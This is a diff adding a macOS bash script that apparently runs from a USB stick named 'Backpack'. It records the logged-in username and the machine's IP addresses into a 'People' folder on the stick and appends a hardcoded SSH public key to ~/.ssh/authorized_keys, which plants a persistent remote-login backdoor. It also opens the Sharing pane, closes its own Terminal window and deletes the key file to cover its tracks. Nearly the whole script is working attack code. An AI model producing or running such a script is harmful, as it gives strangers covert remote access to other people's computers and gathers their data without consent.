@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# On Quit, Clean Up
+trap cleanUp EXIT
+
+# Define Quit Cleanup
+function cleanUp {
+
+  # Quit System Preferences
+osascript -e 'quit app "System Preferences"'
+
+  # Close Terminal Window
+osascript -e 'tell application "Terminal" to close (every window whose name contains "Inject")' &
+
+  # Delete Temporary Files
+rm publicKey
+
+}
+
+# Set Window Name
+echo -n -e "\033]0;Inject\007"
+
+# Global Variables
+usbName="Backpack"
+extractDir="People"
+
+# Open System Preferences to sharing Tab
+open -b com.apple.systempreferences /System/Library/PreferencePanes/SharingPref.prefPane
+
+# Extract Username
+path=`pwd`
+username=${path:7}
+echo $username >> /Volumes/$usbName/$extractDir/$username.txt
+echo "" >> /Volumes/$usbName/$extractDir/$username.txt
+
+# Extract Local IP
+info=`ifconfig | grep inet`
+echo $info >> /Volumes/$usbName/$extractDir/$username.txt
+
+# - Public Key File Start - #
+cat >publicKey <<EOF
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiDSCAr7lD1lyLXOAjuUmGmFCHHNpK8mgi9Dtk3zhHq0iIJoJ9ZTSs+KETys/E8t0zpA46U3FATU7fHxykc6s1hiJ4AcL3ccOS4lzycPGeOiGuXwXrgGzfoD6JE27ocmh8Z71A8NCNxnkpij33EVnFKE931cgzCo+HBbPdH3CTBFek28s4wVh9YlWctl3jFmf/ZFAvjCkOhKc0FFK7iCC/lpAFu86Mw1Cx9hSNV1VC9R0B/crpWPnF8tNs9JDU0WweeESifa8nNH+fErokZVDj+eOVvJSE9BP3D0vYQke2kJFCeDfiKH7bdyjVj7DfO4PcMhGE71B2o58kbCedvbVz
+EOF
+# - Public Key File End - #
+
+# Inject Public Key
+mkdir .ssh
+cat publicKey >> .ssh/authorized_keys
+
+# Wait for USB Ejection
+while test -d /Volumes/$usbName; do
+sleep 1;
+done
